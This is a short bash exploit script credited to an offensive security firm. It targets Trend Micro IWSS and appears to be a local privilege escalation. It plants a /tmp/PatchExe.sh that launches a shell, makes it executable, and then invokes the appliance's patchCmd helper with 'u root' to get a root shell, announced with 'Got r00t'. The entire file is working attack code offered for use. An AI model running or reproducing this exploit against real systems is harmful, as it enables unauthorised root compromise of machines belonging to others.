#!/bin/bash
# Copyright 2011 Buguroo Offensive Security - jrvilla.AT.buguroo.com

cd /tmp
echo "[*] Creating shell file"
echo -e "#!/bin/bash\n/bin/bash" > PatchExe.sh
echo "[*] Change permissions"
chmod 755 PatchExe.sh
echo "[*] Got r00t... Its free!"
/opt/trend/iwss/data/patch/bin/patchCmd u root

